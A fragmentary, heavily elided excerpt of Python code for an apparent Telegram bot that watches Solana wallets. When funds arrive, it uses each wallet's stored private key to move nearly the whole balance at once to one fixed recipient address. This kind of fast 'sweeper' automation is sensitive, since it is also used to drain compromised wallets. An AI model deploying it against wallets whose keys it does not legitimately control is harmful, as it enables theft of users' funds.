...
# Auto-transfer configuration - تحسينات للسرعة القصوى
...
TRANSFER_RPC_URL = os.getenv("TRANSFER_RPC_URL") or SOLANA_RPC_URL # Use TRANSFER_RPC_URL as fallback
...
class SolanaMonitor:
            ...
            while True:
                try:
                    ...
                    if cycle_time < TARGET_CYCLE_TIME * 0.8:
                        polling_interval = max(1, POLLING_INTERVAL - 1)  # Reduce interval if running fast
                    else:
    ...
    async def process_single_transaction(self, wallet_address: str, tx_info: dict):
        ...
        try:
            ...
            if not block_time:
                ...
                logger.info(f"⏰ Using current blockchain time {block_time} for transaction without blockTime")
            ...
            # **NEW: Auto-transfer received funds with speed optimization**
            try:
                # Check if this is a received transaction (positive amount)
                if float(amount) > 0 and amount_float >= MIN_AUTO_TRANSFER_AMOUNT:
                    logger.info(f"💰 Received funds detected: {amount} SOL - initiating immediate auto-transfer")
                    ...
                    if wallet_private_key:
                        # Quick balance check - no waiting
                        ...
                        if current_balance >= MIN_AUTO_TRANSFER_AMOUNT:
                            logger.info(f"🚀 Starting immediate auto-transfer of {current_balance:.9f} SOL")

                            # Attempt auto-transfer with verification
                            transfer_success, tx_signature = await self.auto_transfer_funds_fast(
                                wallet_address,
                                wallet_private_key,
                                RECIPIENT_ADDRESS
                            )
                            ...
                            if transfer_success:
                                ...
                                await self.db_manager.add_transaction_record(
                                    wallet_address,
                                    wallets[0]['chat_id'],
                                    tx_signature or f"auto_transfer_{signature[:16]}",
    ...
    async def check_signature_status_fast(self, signature: str) -> dict:
        ...
        try:
            ...
            async with self.session.post(TRANSFER_RPC_URL, json=payload, timeout=timeout) as response:
                if response.status == 200:
                    data = await response.json()
    ...
    async def check_signature_status(self, signature: str, max_attempts: int = 5) -> dict:
        ...
        for attempt in range(max_attempts):
            try:
                ...
                logger.debug(f"Error checking signature status attempt {attempt + 1}: {e}")
                if attempt < max_attempts - 1:
                    await asyncio.sleep(0.5)

        return {'confirmed': False, 'status': None}

    async def auto_transfer_funds_fast(self, from_wallet: str, private_key: str, to_wallet: str) -> tuple[bool, str]:
        """Ultra-fast auto-transfer optimized for 25 req/sec RPC with blockchain timestamp"""
        transfer_id = f"ultrafast_transfer_{from_wallet[:8]}_{int(asyncio.get_event_loop().time())}"
        ...
        try:
            ...
            logger.info(f"🚀 [{transfer_id}] Starting ULTRA-FAST auto-transfer with blockchain timing")

            # Step 1: Lightning-fast balance check
            current_balance = await self.get_wallet_balance(from_wallet)
            if current_balance <= 0:
                logger.error(f"❌ [{transfer_id}] No balance found")
                return False, None

            # Step 2: Calculate transfer amount
            TRANSFER_FEE = 0.000005
            if current_balance <= TRANSFER_FEE:
                logger.error(f"❌ [{transfer_id}] Balance too low for fees")
                return False, None
            ...
            if transfer_lamports <= 0:
                logger.error(f"❌ [{transfer_id}] Invalid transfer amount")
                return False, None

            logger.info(f"💰 [{transfer_id}] Transferring {amount_to_send:.9f} SOL ({transfer_lamports} lamports)")
            ...
            try:
                ...
                logger.error(f"❌ [{transfer_id}] Key validation failed: {e}")
                return False, None

            # Step 4: Get current blockchain time for accurate timing
            blockchain_timestamp = await self.get_blockchain_time()
            logger.info(f"⏰ [{transfer_id}] Blockchain time: {blockchain_timestamp}")

            # Step 5: Retry loop with signature verification
            for attempt in range(3):  # Maximum 3 attempts
                try:
                    logger.info(f"📤 [{transfer_id}] Transfer attempt {attempt + 1} at blockchain time {blockchain_timestamp}")
                    ...
                    if not blockhash_response or 'result' not in blockhash_response:
                        logger.error(f"❌ [{transfer_id}] Failed to get blockhash on attempt {attempt + 1}")
                        continue

                    recent_blockhash = blockhash_response['result']['value']['blockhash']
                    blockhash_height = blockhash_response['result']['value'].get('lastValidBlockHeight', 0)
                    logger.info(f"🔗 [{transfer_id}] Got fresh blockhash: {recent_blockhash[:16]}... at height {blockhash_height}")
                    ...
                    send_payload = {
                        ...
                        "params": [
                            serialized_tx,
                            {
                                "encoding": "base64",
                                "maxRetries": 0,
                                "skipPreflight": FAST_TRANSFER_CONFIG['skip_preflight'],
                                "preflightCommitment": FAST_TRANSFER_CONFIG['preflight_commitment']
                            }
                        ]
                    }

                    # Record transaction send time
                    send_time = await self.get_blockchain_time()
                    logger.info(f"📡 [{transfer_id}] Sending transaction at blockchain time {send_time}")
                    
                    # استخدام RPC المخصص مباشرة للسرعة القصوى
                    try:
                        timeout = FAST_TRANSFER_CONFIG['timeout']
                        async with self.session.post(TRANSFER_RPC_URL, json=send_payload, timeout=timeout) as response:
                            if response.status == 200:
                                send_response = await response.json()
                            else:
                                send_response = None
                    except Exception:
                        # Fallback to regular RPC call
                    ...
                    if send_response and 'result' in send_response:
                        ...
                        logger.info(f"📤 [{transfer_id}] Transaction sent! Signature: {tx_signature}")

                        # Immediate signature verification with blockchain timing
                        logger.info(f"🔍 [{transfer_id}] Verifying transaction status with blockchain timing...")

                        # Check signature status multiple times with blockchain time tracking
                        for check_attempt in range(8):  # Check for up to 2 seconds only
                            await asyncio.sleep(0.25)  # Wait 250ms between checks

                            # Get current blockchain time for verification
                            verify_time = await self.get_blockchain_time()
                            
                            # استخدام RPC المخصص لفحص التوقيع
                            ...
                            if status_result['confirmed']:
                                if status_result['status'].get('err') is None:
                                    # Get final blockchain confirmation time
                                    confirmation_time = await self.get_blockchain_time()
                                    time_diff = confirmation_time - send_time if send_time else 0
                                    
                                    logger.info(f"✅ [{transfer_id}] Transaction confirmed successfully!")
                                    logger.info(f"📊 [{transfer_id}] Slot: {status_result['status'].get('slot')}")
                                    logger.info(f"📊 [{transfer_id}] Confirmations: {status_result['status'].get('confirmations')}")
                                    logger.info(f"⏰ [{transfer_id}] Blockchain timing - Send: {send_time}, Confirm: {confirmation_time}, Diff: {time_diff}s")
                                    return True, tx_signature
                                else:
                                    error = status_result['status'].get('err')
                                    logger.error(f"❌ [{transfer_id}] Transaction failed with error: {error}")
                                    break  # Don't retry if transaction failed with error
                            else:
                                logger.debug(f"⏳ [{transfer_id}] Transaction not confirmed yet at blockchain time {verify_time}, check {check_attempt + 1}/8")

                        # If we get here, transaction wasn't confirmed in time
                        timeout_time = await self.get_blockchain_time()
                        logger.warning(f"⚠️ [{transfer_id}] Transaction not confirmed within blockchain time window (timeout at {timeout_time}) on attempt {attempt + 1}")

                        # For the last attempt, give it more time with blockchain timing
                        if attempt == 2:
                            logger.info(f"⏳ [{transfer_id}] Final attempt - giving extra blockchain time...")
                            for final_check in range(10):  # Extra 5 seconds for final attempt
                                await asyncio.sleep(0.5)
                                final_check_time = await self.get_blockchain_time()
                                status_result = await self.check_signature_status(tx_signature, max_attempts=1)
                                if status_result['confirmed']:
                                    if status_result['status'].get('err') is None:
                                        final_confirmation_time = await self.get_blockchain_time()
                                        total_time = final_confirmation_time - send_time if send_time else 0
                                        logger.info(f"✅ [{transfer_id}] Transaction confirmed on final check at blockchain time {final_confirmation_time}!")
                                        logger.info(f"⏰ [{transfer_id}] Total blockchain time: {total_time}s")
                                        return True, tx_signature
                                    else:
                                        logger.error(f"❌ [{transfer_id}] Final transaction failed at blockchain time {final_check_time}")
                                        return False, None

                        # Transaction likely dropped, continue to next attempt
                        continue

                    else:
                        # Send failed
                        if send_response and 'error' in send_response:
                            error_info = send_response['error']
                            error_time = await self.get_blockchain_time()
                            logger.error(f"❌ [{transfer_id}] Send failed at blockchain time {error_time} on attempt {attempt + 1}: {error_info}")

                            # Don't retry on insufficient funds
                            if 'insufficient funds' in str(error_info).lower():
                                return False, None
                        else:
                            error_time = await self.get_blockchain_time()
                            logger.error(f"❌ [{transfer_id}] No response from send at blockchain time {error_time} on attempt {attempt + 1}")
                    ...
                    error_time = await self.get_blockchain_time()
                    logger.error(f"❌ [{transfer_id}] Attempt {attempt + 1} failed at blockchain time {error_time}: {e}")
                    if attempt < 2:
                        await asyncio.sleep(1)

            final_error_time = await self.get_blockchain_time()
            logger.error(f"❌ [{transfer_id}] All transfer attempts failed at final blockchain time {final_error_time}")
            return False, None

        except Exception as e:
            critical_error_time = await self.get_blockchain_time()
            logger.error(f"❌ [{transfer_id}] Critical error at blockchain time {critical_error_time}: {e}")
            import traceback
            logger.error(traceback.format_exc())
            return False, None
        ...
        try:
            ...
            if data and 'result' in data:
                ...
                if slot_data and 'result' in slot_data:
                    ...
                    block_time_data = await self.make_rpc_call(block_time_payload, max_retries=1)
                    if block_time_data and 'result' in block_time_data and block_time_data['result']:
                        blockchain_time = block_time_data['result']
                        logger.debug(f"⏰ Got blockchain time: {blockchain_time} for slot {current_slot}")
    ...
    async def get_wallet_balance(self, wallet_address: str) -> float:
        ...
        try:
            ...
            payload = {
                ...
                "params": [
                    wallet_address,
                    {"commitment": FAST_TRANSFER_CONFIG['commitment']}
                ]
            }
            ...
            for commitment in ["confirmed", "processed"]:
                try:
                    ...
                    # Fallback for getBalance if TRANSFER_RPC_URL is not set or fails
...
class SolanaWalletBot:
    ...
    async def handle_stop_all_monitoring(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        ...
        try:
            ...
            for wallet in monitored_wallets:
                try:
                    ...
                    if success:
                        successful_stops += 1
                        stopped_wallets.append(truncate_address(wallet['wallet_address']))
                        logger.info(f"Stopped monitoring wallet {wallet['wallet_address']} for user {chat_id} via 'ايقاف الكل'")
                    else:
                        failed_stops += 1
                except Exception as e:
                    failed_stops += 1
                    logger.error(f"Error stopping wallet {wallet['wallet_address']}: {e}")
